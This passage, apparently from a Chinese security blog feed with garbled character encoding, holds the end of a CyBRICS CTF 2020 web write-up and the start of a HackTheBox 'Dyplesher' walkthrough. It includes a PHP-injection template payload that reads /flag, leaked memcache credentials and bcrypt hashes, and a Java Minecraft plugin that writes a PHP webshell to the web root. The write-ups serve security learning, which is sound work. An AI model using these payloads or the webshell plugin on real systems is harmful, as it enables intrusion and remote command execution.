‡ç­¾ã€‚</p><pre><code class="php">&lt;?phpif (!@$_SESSION[&#39;userid&#39;]) {    redir(&quot;.&quot;);}$userid = $_SESSION[&#39;userid&#39;];$error = false;if (trim(@$_POST[&#39;html&#39;])) {    do {        $html = trim($_POST[&#39;html&#39;]);        if (strpos($html, &#39;&lt;?&#39;) !== false) {            $error = &quot;Bad chars&quot;;            break;        }        $requiredBlocks = [            &#39;id=&quot;back&quot;&#39;,            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,            &#39;id=&quot;digit0&quot;&#39;,            &#39;id=&quot;digit1&quot;&#39;,            &#39;id=&quot;digit2&quot;&#39;,            &#39;id=&quot;digit3&quot;&#39;,            &#39;id=&quot;digit4&quot;&#39;,            &#39;id=&quot;digit5&quot;&#39;,            &#39;id=&quot;digit6&quot;&#39;,            &#39;id=&quot;digit7&quot;&#39;,            &#39;id=&quot;digit8&quot;&#39;,            &#39;id=&quot;digit9&quot;&#39;,            &#39;id=&quot;plus&quot;&#39;,            &#39;id=&quot;equals&quot;&#39;,        ];        foreach ($requiredBlocks as $block) {            if (strpos($html, $block) === false) {                $error = &quot;Missing required block: &#39;$block&#39;&quot;;                break(2);            }        }        $uuid = uuid();        if (!file_put_contents(&quot;calcs/$userid/templates/$uuid.html&quot;, $html)) {            $error = &quot;Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts&quot;;            break;        }        redir(&quot;.&quot;);    } while (false);}?&gt;      &lt;div class=&quot;row&quot;&gt;        &lt;div class=&quot;p-5 mx-auto col-10 col-md-10 bg-info&quot;&gt;&lt;?phpif ($error) {?&gt;          &lt;div class=&quot;alert alert-danger&quot; role=&quot;alert&quot;&gt;            &lt;button type=&quot;button&quot; class=&quot;close&quot; data-dismiss=&quot;alert&quot;&gt;Ã—&lt;/button&gt;            &lt;h4 class=&quot;alert-heading&quot;&gt;Error&lt;/h4&gt;            &lt;p class=&quot;mb-0&quot;&gt;&lt;?=htmlspecialchars($error)?&gt;&lt;/p&gt;          &lt;/div&gt;&lt;?php}?&gt;          &lt;h3 class=&quot;display-3&quot;&gt;New template&lt;/h3&gt;          &lt;div class=&quot;px-4 order-1 order-md-2 col-lg-12&quot;&gt;            &lt;h2 class=&quot;mb-4&quot;&gt;Insert code&lt;/h2&gt;            &lt;form method=&quot;POST&quot;&gt;              &lt;div class=&quot;form-group&quot;&gt; &lt;textarea style=&quot;min-height: 100px; font-family: &#39;Fira Code&#39;, Consolas, monospace;&quot; placeholder=&quot;HTML&quot; class=&quot;form-control form-control-sm&quot; name=&quot;html&quot; oninput=&quot;this.style.height = &#39;&#39;; this.style.height = (this.scrollHeight + 10) +&#39;px&#39;&quot;&gt;&lt;?=htmlspecialchars(@$_POST[&#39;html&#39;])?&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-lg btn-outline-secondary mx-3 px-3&quot;&gt;&lt;i class=&quot;fa fa-plus-square fa-fw fa-1x py-1&quot;&gt;&lt;/i&gt; Create Template&lt;/button&gt;            &lt;/form&gt;          &lt;/div&gt;        &lt;/div&gt;      &lt;/div&gt;</code></pre><p>ç„¶åæˆ‘ä»¬å‘ç°ã€‚calc.phpå¦‚æœä¸ä¼ é€’shareå‚æ•°çš„è¯ã€‚å°†åªæ˜¯ç®€å•çš„requireæˆ‘ä»¬çš„template.ä½†æ˜¯å€˜è‹¥ä¼ é€’share.åˆ™å°†è¿›è¡Œä¸€ä¸ªæ‹¼æ¥ã€‚</p><pre><code class="php">if (@$_POST[&#39;share&#39;]) {    $calc = uuid();    file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));    redir(&quot;?p=sharelink&amp;calc=$calc&quot;);}</code></pre><p>æˆ‘ä»¬çš„å˜é‡fieldä¸ä¹‹åçš„<code>inc/calclib.html</code>ï¼Œä»¥åŠè‡ªå·±çš„templateè¿›è¡Œæ‹¼æ¥ã€‚å½“å†…å®¹ä½œä¸ºfile_put_contentsçš„å‚æ•°å†™è¿›æ–°çš„phpæ–‡ä»¶æ—¶ã€‚<code>&lt;?=</code>æ€»æ˜¯å¯ç”¨çš„(å³ä½œä¸ºecho è°ƒç”¨)é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•è§£å†³æ‰ä¸­é—´æ‹¼æ¥çš„æ–‡ä»¶<code>inc/calclib.html</code>å³å¯ã€‚é€šè¿‡ä½¿ç”¨æ³¨é‡Šç¬¦å°†ä¸¤è€…ä¸­é—´çš„htmlæ–‡ä»¶æ³¨é‡Šæ‰ï¼Œå¹¶åœ¨templateä¸­å†™å…¥æ¶æ„ä»£ç å°±èƒ½å®Œæˆ</p><p><img src="/2020/07/26/CyBRICS-CTF-2020/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æœ¬åœ°æ¨¡æ‹Ÿå†™å…¥çš„æ–‡ä»¶ã€‚å¯ä»¥çœ‹åˆ°ä¸­é—´çš„éƒ¨åˆ†è¢«æ³¨é‡Šæ‰ã€‚æˆ‘ä»¬åªéœ€æ³¨æ„æ­£ç¡®é—­åˆæ‹¬å·ã€‚<br>payload<br>htmlå†…å®¹</p><pre><code class="html">&lt;html&gt;&lt;body&gt;&lt;input type=&quot;text&quot; class=&quot;part&quot; id=&quot;field&quot; name=&quot;field&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit0&quot; data-append=&quot;0&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit1&quot; data-append=&quot;1&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit2&quot; data-append=&quot;2&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit3&quot; data-append=&quot;3&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit4&quot; data-append=&quot;4&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit5&quot; data-append=&quot;5&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit6&quot; data-append=&quot;6&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit7&quot; data-append=&quot;7&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit8&quot; data-append=&quot;8&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;digit9&quot; data-append=&quot;9&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;plus&quot; data-append=&quot; + &quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;minus&quot; data-append=&quot; - &quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;times&quot; data-append=&quot; * &quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;div&quot; data-append=&quot; / &quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;point&quot; data-append=&quot;.&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;clear&quot; /&gt;&lt;input type=&quot;button&quot; class=&quot;part&quot; id=&quot;back&quot; value=&quot;â† Back&quot; /&gt;&lt;input type=&quot;submit&quot; class=&quot;part&quot; id=&quot;share&quot; name=&quot;share&quot; value=&quot;Share&quot; /&gt;&lt;input type=&quot;submit&quot; class=&quot;part&quot; id=&quot;equals&quot; /&gt;*/readfile(&quot;/flag&quot;)));</code></pre><p>ä¹‹åæ¥åˆ°calc.phpä¼ å€¼<code>field=/*&amp;share=1</code>å³å¯åœ¨é‡å®šå‘åå¾—åˆ°å†™å…¥shellçš„åœ°å€ã€‚<br>è¿œç¨‹getflag<br><img src="/2020/07/26/CyBRICS-CTF-2020/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>é¢˜ç›®æ¯”è¾ƒæœ‰æ„æ€ã€‚ä½“éªŒä¸é”™ã€‚åœ¨è¿™ä¹‹å‰çš„ä¸€åœº3kCTFå› ä¸ºæ—¶é—´åŸå› å†™ä¸äº†wpäº†,é¢˜ç›®è´¨é‡å€’æ˜¯æŒºå¥½çš„ã€‚ä¸‹å‘¨å¼€å§‹hwå°±ä¸æ›´æ–‡ç« </p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Dyplesher</title>
      <link href="2020/07/24/hackthebox-Dyplesher/"/>
      <url>2020/07/24/hackthebox-Dyplesher/</url>
      
        <content type="html"><![CDATA[<p>  Dyplesheré¶æœºæ˜¯è‡ªå·±ç¬¬ä¸€æ¬¡å®Œæˆçš„ç°å½¹insaneéš¾åº¦htbé¶æœºã€‚é¶æœºæ¶‰åŠçš„æœåŠ¡ç›¸å¯¹æ¯”è¾ƒå¤š,åŒ…æ‹¬web,gogs,minecraft,memcacheç­‰ç­‰ã€‚ä¸è¿‡è¯´å®è¯åšå®Œåæ„Ÿè§‰éš¾åº¦è·ŸTravelå·®ä¸å¤š,åˆ°ä¸äº†insaneéš¾åº¦ã€‚å¯èƒ½ä¸»è¦æ˜¯é‡Œé¢çš„JavaçŸ¥è¯†å¯¹äºå¤§éƒ¨åˆ†äººæ¥è¯´åç¹çäº†ã€‚æ€»ä½“ä¸Šæ„Ÿè§‰è¿˜æ˜¯ä¸é”™çš„ã€‚è¿™é‡Œè¿˜æ˜¯ç®€å•è®°å½•ä¸‹è¿‡ç¨‹ä»¥åŠææƒéƒ¨åˆ†å­¦åˆ°çš„çŸ¥è¯†å§ã€‚</p><a id="more"></a><p><img src="/2020/07/24/hackthebox-Dyplesher/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>é¶æœºip:10.10.10.190</li><li>kaliip: 10.10.14.23</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>é¦–å…ˆæ˜¯nmapåŸºæœ¬æ‰«æå¾—åˆ°ä¸‰ä¸ªç«¯å£22,80,3000.è¿›ä¸€æ­¥æ‰«æå‘ç°è¿˜æœ‰å…¶ä»–å‡ ä¸ªç«¯å£ã€‚4369(epmd),5672(amqp),11211ç­‰ã€‚</p><p>å…¶ä¸­11211æ˜¯memcacheå¯¹åº”ç«¯å£ã€‚ä¹‹å‰åœ¨travelä¸­ç”¨è¿‡,æ‰€ä»¥å°è±¡æ¯”è¾ƒæ·±åˆ»ã€‚ä¸è¿‡è¿™é‡Œè¿˜æ˜¯ç®€å•ä»ä½ç«¯å£å¼€å§‹å®¡è®¡ã€‚</p><p>é¦–å…ˆweb80ç«¯å£å‘ç°æç¤ºè¿™é‡Œå¯èƒ½è·Ÿmcç›¸å…³ã€‚ä»cookieçš„é…ç½®å¯ä»¥çœ‹å‡ºä¼¼ä¹ä½¿ç”¨äº†laravelæ¡†æ¶ã€‚å› ä¸ºæ˜¯é»‘ç›’æ‰€ä»¥ä¸ç¡®å®šæ˜¯å¦èƒ½ç”¨RCEæ‰“ã€‚</p><p>æ¥ä¸‹æ¥é¦–é¡µè¿˜æç¤ºäº†æˆ‘ä»¬ä¸€ä¸ªå­åŸŸå<code>test.dyplesher.htb</code>ã€‚åŠ åˆ°hostsä¸­ã€‚</p><p>é¡µé¢çš„<code>/staff</code>æœ‰ä¸‰ä¸ªç”¨æˆ·å</p><p><img src="/2020/07/24/hackthebox-Dyplesher/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ä¸‰ä¸ªç”¨æˆ·ååœ¨åé¢ä¼šç»å¸¸å‡ºç°ã€‚</p><p>æ¥ä¸‹æ¥é¡µé¢ä¿¡æ¯æ”¶é›†å®Œäº†ã€‚æˆ‘ä»¬çˆ†ç ´ä¸‹è·¯å¾„ã€‚å‘ç°å­˜åœ¨<code>/login</code>é¡µé¢ã€‚ç®€å•å°è¯•ç™»å½•æœªæœ,çœ‹æ¥éœ€è¦å¦å¤–æ”¶é›†ä¿¡æ¯,æˆ–è€…loginä¸æ˜¯ç›®çš„ã€‚</p><p>3000ç«¯å£æ˜¯ä¸ªgogsæœåŠ¡ã€‚æä¾›gitçš„è¯çœ‹æ¥æ˜¯åˆæœ‰ä¿¡æ¯æ³„éœ²äº†ã€‚ä¸è¿‡åŒæ ·æˆ‘ä»¬æ²¡æœ‰å¯ç”¨çš„ä¿¡æ¯ã€‚ä¸è¿‡gogså€’æ˜¯åœ¨userså¤„æç¤ºæˆ‘ä»¬æœ‰åˆšåˆšä¸Šé¢çš„ä¸‰ä¸ªç”¨æˆ·ã€‚</p><p>æ¥ä¸‹æ¥å»å¾€test.dyplesher.htb.é¡µé¢åªæ¥å—ä¸¤ä¸ªå‚æ•°,ä¼¼ä¹æ˜¯åœ¨åˆ¤æ–­ä½ çš„ä¸¤ä¸ªè¾“å…¥æ˜¯å¦ä¸€è‡´ã€‚ç„¶åå°è¯•æ³¨å…¥ä¹Ÿæœªæœã€‚</p><p>ç»§ç»­æ‰«ç›®å½•ã€‚å¾—åˆ°<code>.git</code>æ³„éœ²ã€‚ä½¿ç”¨githackdumpä¸‹æ¥ã€‚<br>å¾—åˆ°index.phpæºç </p><pre><code class="php">&lt;HTML&gt;&lt;BODY&gt;&lt;h1&gt;Add key and value to memcache&lt;h1&gt;&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;test&quot; ACTION=&quot;&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;add&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;val&quot;&gt;&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;?phpif($_GET[&#39;add&#39;] != $_GET[&#39;val&#39;]){        $m = new Memcached();        $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, true);        $m-&gt;setSaslAuthData(&quot;felamos&quot;, &quot;zxcvbnm&quot;);        $m-&gt;addServer(&#39;127.0.0.1&#39;, 11211);        $m-&gt;add($_GET[&#39;add&#39;], $_GET[&#39;val&#39;]);        echo &quot;Done!&quot;;}else {        echo &quot;its equal&quot;;}?&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;</code></pre><p>å¾—åˆ°ä¸€ç»„memcacheè´¦æˆ·ã€‚å°è¯•webé¡µé¢çš„ç™»å½•æœªæœã€‚äºæ˜¯ç›´æ¥è¿æ¥memcache.æ­¤å¤„æˆ‘ä»¬ä½¿ç”¨nodejsçš„memcache-cli.npmå…¨å±€ä¸‹è½½å³å¯ã€‚</p><pre><code>memcache-cli felamos:zxcvbnm@10.10.10.190:11211 </code></pre><p>è¿æ¥ä¸Šåæ”¶é›†åˆ°ä¸‰ä¸ªç”¨æˆ·å(è¿˜æ˜¯ä¸Šé¢ä¸‰ä¸ªäºº)ä»¥åŠä¸‰ä¸ªbcryptå¯†ç ã€‚</p><pre><code>$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS</code></pre><p>hashcatçˆ†ç ´ä¹‹.åªå¾—åˆ°ä¸€ç»„felamoså¯†ç mommy1ã€‚</p><p>ç»§ç»­ç”¨è¿™ç»„è´¦æˆ·å°è¯•ç™»å½•ã€‚æœ€ååœ¨gogså¤„ç™»å½•æˆåŠŸã€‚åœ¨80ç«¯å£ä»ç„¶ä¸èƒ½ç™»å½•,ä¸€åº¦è®©æˆ‘ä»¥ä¸ºé‚£ä¸ªç™»å½•æ˜¯å‡çš„ã€‚</p><p><img src="/2020/07/24/hackthebox-Dyplesher/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å®¡æŸ¥ç”¨æˆ·felamosçš„ä»“åº“ã€‚åªæœ‰gitlabè·Ÿmemcachedä¸¤ä¸ªã€‚å…¶ä¸­memcachedçš„æˆ‘ä»¬å·²ç»æ”¶é›†è¿‡äº†ã€‚gitlabä»“åº“å‘ç°æ²¡æœ‰å†…å®¹,ä½†æ˜¯æœ‰release.</p><p>ä¸‹è½½releaseä¸­çš„repo.zip(20mbä¸‹äº†å¿«åŠå°æ—¶â€¦â€¦éš¾å—)å¹¶è§£å‹ã€‚</p><pre><code class="bash">root@byc404:~/htb/boxes/Dyplesher/git/repositories# find .../@hashed./@hashed/4e./@hashed/4e/07./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle./@hashed/6b./@hashed/6b/86./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle./@hashed/4b./@hashed/4b/22./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle./@hashed/d4./@hashed/d4/73./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle</code></pre><p>è¿™é‡Œæœ‰<code>.bundle</code>æ–‡ä»¶ã€‚æˆ‘ä»¬å•ç‹¬æ‹¿å‡ºæ¥å¹¶git cloneã€‚</p><pre><code class="bash">#!/bin/bashfor i in $(find ../repositories | grep bundle)do        git clone $idone</code></pre><p>bundle cloneå®Œåçš„å†…å®¹å°±æœ‰ç‚¹å¤šäº†ã€‚åŒæ ·ç®€å•çœ‹ä¸‹å››ä¸ªä»“åº“çš„å†…å®¹,æœ‰çš„æ˜¯è·Ÿmcæœ‰å…³ã€‚æœ‰çš„æ˜¯phpbashshellæœ‰å…³ã€‚å†æ¬¡findä¸‹æ‰¾åˆ°ä¸€ä¸ªsqliteçš„dbæ–‡ä»¶users.dbã€‚ç›´æ¥è¿›å…¥db.<code>select * from users.</code><br>å¾—åˆ°</p><pre><code>18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81</code></pre><p>åˆæ˜¯ä¸€ä¸ªbcryptå¯†ç ã€‚å†åº¦hashcatç ´è§£å¾—åˆ°<code>alexis1</code></p><p>è¿™æ¬¡æˆ‘ä»¬ç»ˆäºèƒ½ç™»å½•è¿›80ç«¯å£çš„é¡µé¢äº†ã€‚è¿›å…¥åå‘ç°æ˜¯ä¸€ä¸ªæ§åˆ¶å°ã€‚é‡Œé¢æ˜¾ç¤ºçš„æ˜¯mcä¿¡æ¯ã€‚ç„¶ååŠŸèƒ½åŒ…æ‹¬ä¸Šä¼ pluginè·Ÿé‡æ–°åŠ è½½æŒ‡å®šplugin.</p><p>emmè™½ç„¶æ²¡ç©è¿‡æ­£ç‰ˆmcä½†æ˜¯è‡³å°‘çŸ¥é“å®ƒæ˜¯javaå†™çš„ã€‚æˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†ä¸‹å‘ç°æœ‰éå¸¸å…¨é¢çš„æŒ‡å—ã€‚æ„Ÿè§‰å°±ç®—ä¸ä¼šjavaçš„äººä¹Ÿèƒ½è·Ÿç€åšäº†ã€‚å½“ç„¶è¿™é‡Œæˆ‘åˆšå¥½å‰ä¸€å¤©ç®€å•å­¦ä¹ äº†ä¸‹<a href="https://bycsec.top/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/#maven" target="_blank" rel="noopener">maven</a>çš„ä½¿ç”¨ã€‚æ‰€ä»¥å°±ideaç›´æ¥ä¸Šæ‰‹mavené¡¹ç›®ã€‚</p><p>å…·ä½“å‚è€ƒ<a href="https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>,æˆ‘å°±ç®€å•åšä¸‹è§£é‡Š,å½“åšideaå­¦ä¹ ç¬”è®°äº†ã€‚</p><p>é¦–å…ˆæ˜¯pom.xmlé…ç½®</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;top.bycsec&lt;/groupId&gt;    &lt;artifactId&gt;java_mc_exp&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;properties&gt;        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;        &lt;maven.compiler.encoding&gt;UTF-8&lt;/maven.compiler.encoding&gt;        &lt;java.version&gt;10&lt;/java.version&gt;        &lt;maven.compiler.source&gt;10&lt;/maven.compiler.source&gt;        &lt;maven.compiler.target&gt;10&lt;/maven.compiler.target&gt;    &lt;/properties&gt;    &lt;repositories&gt;        &lt;repository&gt;            &lt;id&gt;spigotmc-repo&lt;/id&gt;            &lt;url&gt;https://hub.spigotmc.org/nexus/content/repositories/snapshots/&lt;/url&gt;        &lt;/repository&gt;    &lt;/repositories&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.spigotmc&lt;/groupId&gt;            &lt;artifactId&gt;spigot-api&lt;/artifactId&gt;            &lt;version&gt;1.16.1-R0.1-SNAPSHOT&lt;/version&gt;            &lt;scope&gt;provided&lt;/scope&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;</code></pre><p>groupIDè¿™ç§å»ºé¡¹ç›®å‰å°±åº”è¯¥å·²ç»è®©æˆ‘ä»¬è‡ªå·±é…ç½®å¥½äº†ã€‚æˆ‘æŒ‰ç…§æ­£å¸¸æ ‡å‡†å®šä¸º<code>top.bycsec</code>.ç„¶åä¸‹é¢propertiesçš„è®¾å®šæ˜¯ä¸€ä¸ªå°å‘ã€‚å› ä¸ºè‡ªå·±ideaçš„jdkç‰ˆæœ¬è·Ÿç³»ç»Ÿä¸ä¸€è‡´,ç„¶åè¿˜æœ‰ç³»ç»Ÿçš„è¯­è¨€levelæ°´å¹³ç­‰ç­‰é—®é¢˜ã€‚å¯¼è‡´mavenç¼–è¯‘æ—¶ä¼šå‡ºç°æŠ¥é”™â€ä¸æ”¯æŒå‘è¡Œç‰ˆæœ¬5â€.ç»å¸¸æ”¹å®Œäº†é…ç½®è¿˜æ˜¯æŠ¥é”™ã€‚è§£å†³æ–¹æ³•åªæœ‰åƒä¸Šé¢é‚£æ ·æŒ‰ç…§è‡ªå·±çš„æ ‡å‡†é…ç½®pom.xmlæ‰èƒ½é¿å…æŠ¥é”™ã€‚</p><p>ä¸‹é¢çš„ä»“åº“æ˜¯spigot ç»™mcç”¨çš„mavenä»“åº“ã€‚æˆ‘ä»¬ä¼šç”¨åˆ°çš„spigot-apiå¾—å»å¯¹åº”çš„ä»“åº“ä¸‹è½½ã€‚</p><p>ç„¶åæœ€ç»ˆå®Œæ•´çš„ç›®å½•ç»“æ„å¦‚ä¸‹ã€‚<br><img src="/2020/07/24/hackthebox-Dyplesher/1.5.PNG" class="lazyload" data-srcset="1.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>resourceså³å¤–éƒ¨èµ„æºåŒ…ä¸­éœ€è¦<code>plugin.yml</code>æ¥æŒ‡å®špluginä¿¡æ¯ã€‚è¿™é‡Œéå¸¸é‡è¦ã€‚å› ä¸ºæˆ‘ä»¬åé¢è¦ç”¨åˆ°pluginçš„å‘½å­—ã€‚å…¶ä¸­ä¼¼ä¹ä¸èƒ½åŒ…å«<code>_</code>è¿™æ ·çš„å­—ç¬¦ã€‚æ‰€ä»¥ç›´æ¥å–ä¸€ä¸ªæ­£å¸¸çš„åå­—ã€‚</p><p>ç„¶åæ˜¯mainä¸‹ç¼–å†™ã€‚è¿™é‡Œæˆ‘ä»¬å› ä¸ºä¸æ˜¯ç”¨çš„mvnåˆ›å»ºçš„,æ˜¯ä¸ä¼šæŒ‡å®šåŒ…çš„ã€‚æ‰€ä»¥æˆ‘ä»¬è‡ªå·±å»ºä¸ªåŒ…<code>top.bycsec.plugin</code>å¹¶æ–°å»º<code>PluginExp</code>ä½œä¸ºè¦åŠ è½½çš„ä¸»ç±»ã€‚åŒæ—¶plugin.ymlä¸­ä¹Ÿå°†è¿™ä¸ªç±»æŒ‡å®šä¸ºåŠ è½½çš„ä¸»ç±»ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯åˆ©ç”¨ç±»çš„ç¼–å†™</p><pre><code class="java">package top.bycsec.plugin;import org.bukkit.plugin.java.JavaPlugin;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;public class PluginExp extends JavaPlugin {    @Override    public void onEnable() {        final String code=&quot;&lt;?php @system($_REQUEST[byc]);?&gt;&quot;;        try {            File file = new File(&quot;/var/www/html/bycshell.php&quot;);            if (!file.exists()) {                File dir = new File(file.getParent());                dir.mkdirs();                file.createNewFile();            }            FileOutputStream outStream = new FileOutputStream(file);            outStream.write(code.getBytes());            outStream.close();        } catch (IOException e) {            e.printStackTrace();        }        super.onEnable();    }    @Override    public void onDisable() {        super.onDisable();    }}</code></pre><p>é¦–å…ˆæ³¨æ„æ’ä»¶ç±»å¿…é¡»ç»§æ‰¿JavaPluginã€‚è¿™ä¸ªmavenä¸‹è½½ä¾èµ–æ—¶ä¼šå¸®æˆ‘ä»¬ä¸‹å¥½ã€‚ç„¶ååªéœ€é‡å†™ä¸¤ä¸ªæ–¹æ³•å³å¯ã€‚æˆ‘ä»¬ä½¿ç”¨onEnableæ’å…¥æ¶æ„ä»£ç ,è¿™æ ·å°±å¯ä»¥åœ¨æ’ä»¶ç”Ÿæ•ˆæ—¶ç›´æ¥æ‰§è¡Œã€‚</p><p>è¿™é‡Œé€‰æ‹©å†™å…¥webshellåŸå› 